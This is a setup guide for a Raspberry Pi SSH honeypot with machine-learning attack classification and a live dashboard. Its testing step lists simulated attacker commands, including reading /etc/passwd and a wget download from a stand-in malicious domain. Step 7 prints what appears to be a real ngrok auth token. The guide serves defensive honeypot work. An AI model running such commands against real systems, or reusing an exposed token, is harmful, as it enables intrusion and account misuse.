# FALSEDOOR: Complete Fresh Ubuntu Server Installation & Implementation Guide

**Project:** FALSEDOOR: Real-Time Honeypot Telemetry & Machine Learning Intrusion Detection  
**Target Device:** Raspberry Pi / Ubuntu Server (20.04 / 22.04 / 24.04 LTS)  
**Live Frontend:** [https://falsedoor.netlify.app/](https://falsedoor.netlify.app/)  
**GitHub Repository:** [https://github.com/ELandoCharlotte/FALSEDOOR.git](https://github.com/ELandoCharlotte/FALSEDOOR.git)

---

## Architecture Overview

```
                                      INTERNET
                                         │
        ┌────────────────────────────────┴────────────────────────────────┐
        │                                                                 │
        ▼                                                                 ▼
┌───────────────────────────────┐               ┌─────────────────────────────────────────┐
│     NETLIFY DASHBOARD         │               │         RASPBERRY PI (UBUNTU)           │
│  https://falsedoor.netlify.app│               │                                         │
│                               │  fetches API  │  ┌───────────────────────────────────┐  │
│  • PWA Static Frontend        │───────────────┼─▶│ FastAPI Backend (:8000)           │  │
│  • Mobile & Desktop View      │  (via ngrok)  │  │ • CORS configured for Netlify     │  │
│  • In-Browser Dynamic URL     │               │  └─────────────────┬─────────────────┘  │
│    every 3s polling           │               │                    │ reads logs         │
└───────────────────────────────┘               │                    ▼                    │
                                                │  ┌───────────────────────────────────┐  │
                                                │  │ Cowrie SSH Honeypot (:2222)       │  │
                                                │  │ • Attacks recorded live           │  │
                                                │  │ • cowrie.json audit log           │  │
                                                │  └─────────────────┬─────────────────┘  │
                                                │                    │ ML classification  │
                                                │                    ▼                    │
                                                │  ┌───────────────────────────────────┐  │
                                                │  │ Random Forest Classifier          │  │
                                                │  │ • 100 Trees (Scikit-Learn)        │  │
                                                │  └───────────────────────────────────┘  │
                                                └─────────────────────────────────────────┘
```

---

## ⚡ Quick Start (If You Want Everything Automated in 1 Command)

If you just want everything installed and launched automatically without typing manual commands:

```bash
# 1. Clone repository onto your Ubuntu Server
git clone https://github.com/ELandoCharlotte/FALSEDOOR.git ~/FALSEDOOR
cd ~/FALSEDOOR

# 2. Run the one-click master launcher
bash start.sh
```

`start.sh` will automatically install Python packages, train the ML model, configure firewall rules, set up ngrok with your auth token, and start the honeypot and API.

If you prefer to understand and set up each component step-by-step, follow the complete guide below.

---

## STEP 1: System Update & Core Packages

Connect to your Raspberry Pi / Ubuntu Server via SSH and update the system:

```bash
sudo apt update && sudo apt upgrade -y
```

Install core dependencies (Python 3, venv, pip, Git, networking tools, and build essentials):

```bash
sudo apt install -y python3 python3-pip python3-venv git curl ufw net-tools libssl-dev libffi-dev build-essential
```

---

## STEP 2: Configure UFW Firewall (Important!)

> [!CAUTION]
> Always ensure port **22** (your real management SSH) is allowed first before enabling UFW so you do not lock yourself out!

```bash
# 1. Keep your real administrative SSH open
sudo ufw allow 22/tcp

# 2. Open port 2222 for Cowrie Decoy SSH Honeypot
sudo ufw allow 2222/tcp

# 3. Open port 8000 for FastAPI SOC Engine
sudo ufw allow 8000/tcp

# 4. Enable firewall
sudo ufw --force enable
sudo ufw status
```

---

## STEP 3: Clone or Transfer the Project

### Option A: Direct Git Clone (Recommended)
```bash
git clone https://github.com/ELandoCharlotte/FALSEDOOR.git ~/FALSEDOOR
cd ~/FALSEDOOR
```

### Option B: Using the Pre-Built Zip
From your Windows PC:
```powershell
scp "C:\Users\ELs\Downloads\UITM\FYP\terst\FALSEDOOR_UBUNTU_DEPLOY.zip" ubuntu@<YOUR_PI_IP>:~/
```
Then on your Ubuntu Server:
```bash
unzip ~/FALSEDOOR_UBUNTU_DEPLOY.zip -d ~/FALSEDOOR
cd ~/FALSEDOOR
```

---

## STEP 4: Set Up Python Virtual Environment & Scikit-Learn

The FastAPI backend and Scikit-Learn classifier run inside a clean Python virtual environment.

```bash
cd ~/FALSEDOOR/server

# Create virtual environment
python3 -m venv venv

# Activate virtual environment
source venv/bin/activate

# Upgrade pip
pip install --upgrade pip

# Install dependencies (FastAPI, Scikit-Learn, Pandas, Numpy, Uvicorn)
pip install -r requirements.txt
```

### Verifying Scikit-Learn Installation:
```bash
python3 -c "import sklearn, pandas, numpy, fastapi, uvicorn; print('✓ All Python ML packages installed successfully!')"
```

---

## STEP 5: Train / Verify the Random Forest Classifier

Your machine learning intrusion detection pipeline uses a **Random Forest Classifier (100 Trees)**.

To train or re-train the model on your captured attack data:

```bash
cd ~/FALSEDOOR
source server/venv/bin/activate
python3 ml/train_model.py
```

Expected output:
```text
============================================================
  FALSEDOOR - Random Forest Model Training
============================================================
Loading Cowrie dataset: var/log/cowrie/cowrie.json...
Total raw Cowrie events parsed: 17
Features extracted: 17
Classes: ['Brute Force', 'Command Execution', 'Malware Download Attempt']
Training Random Forest Classifier (n_estimators=100)...
Model training complete!
Model saved to: ml/random_forest_model.pkl
============================================================
```

---

## STEP 6: Set Up Cowrie SSH Honeypot (Port 2222)

Cowrie acts as the deceptive decoy trap that catches brute force attempts, logins, and commands.

### 1. Verify Cowrie Configuration
The honeypot configuration is pre-configured in `~/FALSEDOOR/etc/cowrie.cfg`:
- **SSH Listen Port:** `2222` (Attackers connect here)
- **JSON Log Path:** `var/log/cowrie/cowrie.json`

### 2. Verify or Install Cowrie Virtual Environment (If Running Standalone Cowrie)
If you want to run the official Cowrie daemon:
```bash
cd ~/FALSEDOOR

# Create dedicated cowrie environment
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install --upgrade pip
pip install cowrie
```

### 3. Start Cowrie
```bash
cowrie start
```
To check status:
```bash
cowrie status
```
Logs will be written automatically to `~/FALSEDOOR/var/log/cowrie/cowrie.json`.

---

## STEP 7: Set Up ngrok with Your Auth Token & Permanent Free Domain

ngrok creates an HTTPS tunnel so your Netlify-hosted dashboard can communicate with your Pi from anywhere in the world.

### 1. Install ngrok
```bash
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
sudo apt update -qq && sudo apt install -y ngrok
```

### 2. Register Your Auth Token (Already Saved)
```bash
ngrok config add-authtoken 3L7JPrPgQCp6OC7NgCqlDObfQbm_64CedrzrSkAuzcUeqs9UK
```

### 3. (Optional & Recommended) Use Your 1 Free Permanent ngrok Domain
Every free ngrok account gets **1 permanent domain** that never changes:
1. Visit [https://dashboard.ngrok.com/domains](https://dashboard.ngrok.com/domains)
2. Copy your free domain (e.g. `your-domain.ngrok-free.app`).
3. Save it to `~/FALSEDOOR/server/ngrok_domain.txt`:
   ```bash
   echo "your-domain.ngrok-free.app" > ~/FALSEDOOR/server/ngrok_domain.txt
   ```
4. Now your public tunnel URL will **never change**, even if your Pi reboots!

---

## STEP 8: Start Everything (FastAPI + ngrok)

You can launch both the FastAPI backend and ngrok with the pre-configured script:

```bash
cd ~/FALSEDOOR
bash start.sh
```

The terminal will show:
```text
╔══════════════════════════════════════════════════════════════════════════╗
║                           FALSEDOOR IS INBOUND                           ║
╠══════════════════════════════════════════════════════════════════════════╣
║                                                                          ║
║  Honeypot SSH Port : 2222 (Ready for attacker connections)               ║
║  Local API         : http://172.20.10.2:8000                             ║
║  Public Stream URL : https://geriatric-alibi-refinance.ngrok-free.dev    ║
║  Attack Target     : ssh -p 2222 root@172.20.10.2                        ║
║  Dashboard Status  : Active & Sniffing Inbound Telemetry                 ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
```

---

## STEP 9: Connect Netlify Dashboard (In Browser — Zero Nano)

1. Open your browser and visit: **[https://falsedoor.netlify.app/](https://falsedoor.netlify.app/)**
2. Touch / click the fingerprint scanner to unlock.
3. Click the **`[STREAMING LIVE]`** badge at the top right of the topbar.
4. In the **"HIVE TELEMETRY CONNECTION"** popup, paste your public ngrok URL:
   `https://xxxx-xx-xx-xx.ngrok-free.app`
5. Click **`Save & Connect`**.

The Netlify dashboard will instantly verify the `/api/health` endpoint and begin streaming live telemetry every 3 seconds!

---

## STEP 10: Simulate Live Attacks to Verify

Test that attacks appear on your Netlify website:

1. Open a new terminal on another PC, laptop, or phone (Termux):
   ```bash
   ssh root@<YOUR_PI_IP> -p 2222
   ```
2. Enter decoy passwords:
   ```text
   admin
   123456
   password
   root
   ```
3. Once logged in, execute suspicious attacker commands:
   ```bash
   uname -a
   cat /etc/passwd
   wget http://malicious-domain.com/malware.sh
   exit
   ```
4. **Watch `https://falsedoor.netlify.app/`:**
   - Attack counter increases in real time.
   - Attack events appear in the Live Attack Feed table.
   - Pie charts update automatically.
   - The Random Forest classifier classifies the attack into:
     - `Brute Force`
     - `Command Execution`
     - `Malware Download Attempt`
   - Confidence percentage (e.g. 98.4%) is displayed.

---

## Useful Maintenance Commands

| Action | Command |
|---|---|
| **Start Everything** | `cd ~/FALSEDOOR && bash start.sh` |
| **Check Port 8000 (API)** | `curl http://localhost:8000/api/health` |
| **Check Port 2222 (Cowrie)** | `nc -zv 127.0.0.1 2222` |
| **View Live Cowrie JSON Log** | `tail -f ~/FALSEDOOR/var/log/cowrie/cowrie.json` |
| **View ngrok Active Tunnel** | `curl -s http://127.0.0.1:4040/api/tunnels` |
| **Stop All FALSEDOOR Services** | Press `[Ctrl+C]` in the `start.sh` terminal |
